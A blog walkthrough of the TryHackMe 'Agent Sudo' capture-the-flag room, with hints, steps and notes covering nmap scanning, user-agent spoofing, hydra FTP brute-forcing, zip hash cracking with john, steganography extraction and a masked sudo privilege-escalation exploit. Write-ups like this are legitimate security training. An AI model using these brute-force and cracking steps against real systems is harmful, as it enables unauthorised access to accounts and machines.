---
title: Agent Sudo -/ TryHackMe Walkthrough
author: Mr Ash
type: "post"
published: 2022-07-09
lastUpdated: 2022-11-05
url: "/agent-sudo/"
image: https://p146.p4.n0.cdn.getcloudapp.com/items/WnuDq4KN/00cd5204-7161-4728-ae1b-8552248e9747.jpg?v=40fdd0801164d7a95b5a5487f11cf83b
categories: Cyber
tags:
    - 100DaysOfHacking
    - TryHackMe
    - Capture The Flag
    - Walkthrough
---

Welcome back to another [TryHackMe](https://tryhackme.com/) room, the challenge today is [Agent Sudo](https://tryhackme.com/room/agentsudoctf).

No spoilers below within the hints, just some good ol’ fashion hints to help you out on your agent sudo journey. For more detail, with some spoilers, see the steps section, and for everything I did, see my notes. If you prefer a video walkthrough, well that’s linked below, and if you want my personal thoughts on the room, check out the reflection via the video.

*Disclaimer, there are spoilers for this room below, please use the hints if you do not want any steps spoiled. Room creator credit: [DesKel](https://tryhackme.com/p/DesKel).*

<!-- <figure class="wp-block-embed is-type-video is-provider-youtube wp-block-embed-youtube wp-embed-aspect-16-9 wp-has-aspect-ratio"><div class="wp-block-embed__wrapper"><iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" frameborder="0" height="450" loading="lazy" src="https://www.youtube.com/embed/PYQ51M8qTbw?feature=oembed" title="Agent Sudo // TryHackMe Walkthrough" width="800"></iframe></div></figure><div id="hs-embed-container" style="position:relative;display:flex;width:100%;height:300px;"><div id="hs-embed-placeholder" style="position:absolute;top:0;bottom:0;left:0;right:0;margin:10px;overflow:auto;font-size: 14px !important">[ Agent Sudo // TryHackMe Walkthrough – powered by Happy Scribe](https://www.happyscribe.com/?utm_source=embed-player&utm_term=b764bacd7be54743bcb64bd390e2ee4a "Listen: Agent Sudo // TryHackMe Walkthrough was transcribed from audio to text using Happy Scribe")

</div><div class="hs-embed" data-hide_video="true" data-id="b764bacd7be54743bcb64bd390e2ee4a" data-private_text="true"></div><script>
var js=document.createElement('script');js.type='text/javascript';js.async=true;js.src='https://embed.happyscribe.co/main.js';document.head.appendChild(js);
</script></div><style type="text/css"> ._h1s512 { white-space: nowrap; } </style> -->

## Hints

Task 2 Enumerate

- How many open ports? `nmap` can show you.
- How you redirect yourself to a secret page? Read the note on `index.html`
- What is the agent name? Use the web dev tools to change `user-*****`

Task 3 Hash cracking and brute-force

- FTP password. Use `hydra` with `rockyou.txt`
- Zip file password. Use `binwalk` to *really* see the `png`, then `zip2jon`.
- steg password. Use `steghide` to *really* see the `jpg`.
- Who is the other agent (in full name)? `cat` your new `message.txt`
- SSH password. `base64 -d`

Task 4 Capture the user flag

- What is the user flag? Once in, simple `cat`
- What is the incident of the photo called? Use OSINT via bing.

<!-- <div class="elementor elementor-5483" data-elementor-id="5483" data-elementor-type="section"><div class="elementor-section-wrap"> <section class="elementor-section elementor-top-section elementor-element elementor-element-32d8c94 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-element_type="section" data-id="32d8c94" data-particle-mobile-disabled="false" data-particle_enable="false" data-settings="{"ekit_has_onepagescroll_dot":"yes"}"><div class="elementor-container elementor-column-gap-default"><div class="elementor-row"><div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-5e7c56e" data-element_type="column" data-id="5e7c56e"><div class="elementor-column-wrap elementor-element-populated"><div class="elementor-widget-wrap"> <section class="elementor-section elementor-inner-section elementor-element elementor-element-fc64076 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-element_type="section" data-id="fc64076" data-particle-mobile-disabled="false" data-particle_enable="false" data-settings="{"ekit_has_onepagescroll_dot":"yes"}"><div class="elementor-container elementor-column-gap-no"><div class="elementor-row"><div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-f7d6b37" data-element_type="column" data-id="f7d6b37"><div class="elementor-column-wrap elementor-element-populated"><div class="elementor-widget-wrap"><div class="elementor-element elementor-element-4c75247 elementor-widget elementor-widget-text-editor" data-element_type="widget" data-id="4c75247" data-settings="{"ekit_we_effect_on":"none"}" data-widget_type="text-editor.default"><div class="elementor-widget-container"><div class="elementor-text-editor elementor-clearfix">Recent Posts

 </div> </div> </div><div class="elementor-element elementor-element-322ad34 elementor-widget elementor-widget-elementskit-post-list" data-element_type="widget" data-id="322ad34" data-settings="{"ekit_we_effect_on":"none"}" data-widget_type="elementskit-post-list.default"><div class="elementor-widget-container"><div class="ekit-wid-con">- [ <span class="elementor-icon-list-icon">  </span><div class="ekit_post_list_content_wraper"> <span class="elementor-icon-list-text">How To Fix TryHackMe VPN Not Working | Troubleshooting OpenVPN</span> </div> ](https://mrash.co/how-to-fix-tryhackme-vpn-not-working-troubleshooting-openvpn/)
- [ <span class="elementor-icon-list-icon">  </span><div class="ekit_post_list_content_wraper"> <span class="elementor-icon-list-text">Crack The Hash TryHackMe Walkthrough</span> </div> ](https://mrash.co/crack-the-hash-tryhackme-walkthrough/)
- [ <span class="elementor-icon-list-icon">  </span><div class="ekit_post_list_content_wraper"> <span class="elementor-icon-list-text">100 Days Of Hacking</span> </div> ](https://mrash.co/100daysofhacking/)
 
 </div> </div> </div> </div> </div> </div> </div> </div> </section> <section class="elementor-section elementor-inner-section elementor-element elementor-element-d91d33b elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-element_type="section" data-id="d91d33b" data-particle-mobile-disabled="false" data-particle_enable="false" data-settings="{"ekit_has_onepagescroll_dot":"yes"}"><div class="elementor-container elementor-column-gap-no"><div class="elementor-row"><div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-6dee180" data-element_type="column" data-id="6dee180"><div class="elementor-column-wrap elementor-element-populated"><div class="elementor-widget-wrap"><div class="elementor-element elementor-element-7acfc36 elementor-widget elementor-widget-text-editor" data-element_type="widget" data-id="7acfc36" data-settings="{"ekit_we_effect_on":"none"}" data-widget_type="text-editor.default"><div class="elementor-widget-container"><div class="elementor-text-editor elementor-clearfix">Popular Posts

 </div> </div> </div><div class="elementor-element elementor-element-7b9396d elementor-widget elementor-widget-elementskit-post-list" data-element_type="widget" data-id="7b9396d" data-settings="{"ekit_we_effect_on":"none"}" data-widget_type="elementskit-post-list.default"><div class="elementor-widget-container"><div class="ekit-wid-con">- [ <span class="elementor-icon-list-icon">  </span><div class="ekit_post_list_content_wraper"> <span class="elementor-icon-list-text">OneNote to Notion - Moving Apps</span> </div> ](https://mrash.co/onenote-to-notion-moving-apps/)
- [ <span class="elementor-icon-list-icon">  </span><div class="ekit_post_list_content_wraper"> <span class="elementor-icon-list-text">100 Days Of Hacking</span> </div> ](https://mrash.co/100daysofhacking/)
- [ <span class="elementor-icon-list-icon">  </span><div class="ekit_post_list_content_wraper"> <span class="elementor-icon-list-text">Hackers Learning Path</span> </div> ](https://mrash.co/learning-path-for-beginner-hacker/)
 
 </div> </div> </div> </div> </div> </div> </div> </div> </section><div class="elementor-element elementor-element-2763e2a elementor-widget elementor-widget-text-editor" data-element_type="widget" data-id="2763e2a" data-settings="{"ekit_we_effect_on":"none"}" data-widget_type="text-editor.default"><div class="elementor-widget-container"><div class="elementor-text-editor elementor-clearfix">\*Shamless self-promotion, I know.

 </div> </div> </div> </div> </div> </div> </div> </div> </section> </div> </div> -->

## Task 5 Privilege escalation
- CVE number for the escalation. `sudo -*`
- What is the root flag? `cat /root/root.txt`
- (Bonus) Who is Agent R? see `root.txt`

## Steps

1. Task 2 Enumerate, as always, start by scanning the machine, I used `nmap -vv -A <ip>`. We can see ports 21, 22 and 80, so most likely we have a web server running, let’s confirm this.
2. Visithttp://&lt;ip&gt; to get the next clue, change the user-agent by going to Inspect (DevTools) &gt; Customise and control DevTools &gt; More Tools &gt; Network conditions, User agent. Here you can change the user-agent by disabling/unchecking Use browser default. Reload the page, and you’re done!
3. Task 3 Hash cracking and brute-force. Now that leads us back to port 21, ftp, so now armed with a username, let’s use brute force. Use hydra -t 32 -l \*\*\*\*\* -P /usr/share/wordlists/rockyou.txt -vV &lt;ip&gt; ftp against the target and you’ll be able to find the password, so then log in using ftp &lt;ip&gt;, and mget \* to copy all the files.
4. It’s time to examine what we’ve found, run file \* to show some basic info, but use binwalk to show hidden info within the files. Then binwalk -e cutie.png to pull out the data, again running file \* will help here with new files. Use zip2john 8702.zip &gt; 8702.hashes to extract the hash, then john 8702.hashes to crack it.
5. The new text file provides a cryptic message, we can decode this using echo \*\*\*\*\*\*\*\* | base64 -d. That’s the steg password, use `steghide extract -sf cute-alien.jpg -p ******` to gain SSH creds, then `ssh *****@<ip>`. Next up, Task 4 Capture the user flag.
6. Now copy the files over via `scp -r * *****@<ip>: .`, use a bit of OSINT and find the CVE. For more, use my notes below or hints above for help, enjoy!

## Notes

nmap: `nmap -vv -A <ip>`

```bash
Completed NSE at 02:52, 0.00s elapsed
Nmap scan report for 10.10.253.182
Host is up, received conn-refused (0.32s latency).
Scanned at 2022-07-06 02:51:25 EDT for 42s
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5hdrxDB30IcSGobuBxhwKJ8g+DJcUO5xzoaZP/vJBtWoSf4nWDqaqlJdEF0Vu7Sw7i0R3aHRKGc5mKmjRuhSEtuKKjKdZqzL3xNTI2cItmyKsMgZz+lbMnc3DouIHqlh748nQknD/28+RXREsNtQZtd0VmBZcY1TD0U4XJXPiwleilnsbwWA7pg26cAv9B7CcaqvMgldjSTdkT1QNgrx51g4IFxtMIFGeJDh2oJkfPcX6KDcYo6c9W1l+SCSivAQsJ1dXgA2bLFkG/wPaJaBgCzb8IOZOfxQjnIqBdUNFQPlwshX/nq26BMhNGKMENXJUpvUTshoJ/rFGgZ9Nj31r
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHdSVnnzMMv6VBLmga/Wpb94C9M2nOXyu36FCwzHtLB4S4lGXa2LzB5jqnAQa0ihI6IDtQUimgvooZCLNl6ob68=
|   256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOL3wRjJ5kmGs/hI4aXEwEndh81Pm/fvo8EvcpDHR5nt
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 02:52
Completed NSE at 02:52, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 02:52
Completed NSE at 02:52, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 02:52
Completed NSE at 02:52, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
Nmap done: 1 IP address (1 host up) scanned in 42.85 seconds

```

Visit: `http://<ip>` Changed User-Agent \[[Link](https://www.searchenginejournal.com/change-user-agent/368448/)\], redirected: `http://<ip>/agent_C_attention.php`, Found name Agent C.

```bash
Attention *****,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

From,
Agent R

```

Crack FTP: `hydra -t 32 -l ***** -P /usr/share/wordlists/rockyou.txt -vV <ip> ftp` \[[LINK](https://www.binarytides.com/crack-ftp-passwords-with-thc-hydra-tutorial/)\]

```bash
[21][ftp] host: <ip>  login: *****   ****password: *****

```

Logged into FTP `ftp <ip>`, ran `mget *` to get all the files.

Examine images: `binwalk`, extracted image data: `binwalk -e cutie.png`.

Installed `sudo apt install 7zip` \[[Link](https://ubuntuforums.org/showthread.php?t=1416364), [Link](https://super-unix.com/ubuntu/ubuntu-extracting-zip-file-fails-giving-error-need-pk-compat-v5-1/)\] `7z e 365.zlib`.

Cracking zip file \[[Link](https://dfir.science/2014/07/how-to-cracking-zip-and-rar-protected.html)\]: `zip2john 8702.zip > 8702.hashes`, `john 8702.hashes`

```bash
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
*****            ****(8702.zip/To_agentR.txt)     
1g 0:00:00:00 DONE 2/3 (2022-07-08 01:35) 2.222g/s 101044p/s 101044c/s 101044C/s 123456..ferrises
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

```

`cat To_agentR.txt`

```bash
Agent C,

We need to send the picture to **'********'** as soon as possible!

By,
Agent R

```

Finding hash value: `echo ******** | base64 -d`, `steghide extract -sf cute-alien.jpg -p ******`.

```bash
Hi *****,

Glad you find this message. Your login password is ****************

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
*****

```

Connect via SSH: `ssh *****@<ip>`, copy over image: `scp -r * *****@<ip>: .` \[[Link](https://youtu.be/gGe1cNgfHwE), [Link](https://www.freecodecamp.org/news/scp-linux-command-example-how-to-ssh-file-transfer-from-remote-to-local/)\].

Ran `sudo -*`, searched ‘exploit sudo \*\*\*\*\*\*\*\*\*\*\*\*’, found exploit `sudo ***** *********`

```bash
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
********************************

By,
****** a.k.a Agent R

```

{{<youtube PYQ51M8qTbw>}}

This is day 54 of [#100DaysOfHacking](https://mrashleyball.com/100daysofhacking/) on my [Hackers Learning Path](https://mrashleyball.com/learning-path-for-beginner-hacker/). [Subscribe](https://go.mrash.co/newsletter) for [CyberSec](https://mrashleyball.com/starting-out-in-cyber-security/) updates or [read](https://mrashleyball.com/blog) more, happy hacking, coding, and ‘learning.